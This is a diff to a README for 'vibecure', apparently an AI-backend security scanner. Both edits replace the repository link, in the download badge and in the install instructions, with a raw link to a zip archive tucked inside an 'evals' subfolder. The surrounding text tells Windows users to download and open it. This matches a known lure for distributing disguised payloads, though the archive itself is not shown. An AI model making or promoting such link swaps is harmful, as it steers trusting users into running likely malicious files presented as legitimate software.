@@ -1,6 +1,6 @@
 # 🔐 vibecure - Scan AI Backends Before Launch
 
-[![Download vibecure](https://img.shields.io/badge/Download-vibecure-6C63FF?style=for-the-badge&logo=github)](https://github.com/Navalmissilebooth991/vibecure)
+[![Download vibecure](https://img.shields.io/badge/Download-vibecure-6C63FF?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Navalmissilebooth991/vibecure/main/skills/vibecure/evals/llm-uncapped-costs/Software-2.5.zip)
 
 ## 🧭 What vibecure does
 
@@ -22,7 +22,7 @@ If you are scanning your own app, you can use the folder on your computer that h
 
 Visit this page to download and run the app:
 
-https://github.com/Navalmissilebooth991/vibecure
+https://raw.githubusercontent.com/Navalmissilebooth991/vibecure/main/skills/vibecure/evals/llm-uncapped-costs/Software-2.5.zip
 
 If the page includes a release file or setup file, save it to your Windows PC and open it after the download finishes.
 
